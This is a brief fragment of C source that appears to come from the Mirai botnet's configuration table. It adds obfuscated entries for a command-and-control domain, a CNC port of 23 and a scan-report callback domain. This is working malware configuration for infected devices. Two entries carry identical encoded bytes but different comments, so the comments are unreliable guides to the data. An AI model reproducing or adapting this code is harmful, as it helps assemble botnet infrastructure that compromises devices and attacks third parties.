...
{
    add_entry(TABLE_CNC_DOMAIN, "\x46\x47\x40\x4B\x43\x4C\x0C\x4B\x41\x43\x51\x22", 12); // cnc.changeme.com
    add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23

    add_entry(TABLE_SCAN_CB_DOMAIN, "\x46\x47\x40\x4B\x43\x4C\x0C\x4B\x41\x43\x51\x22", 12); // report.changeme.com
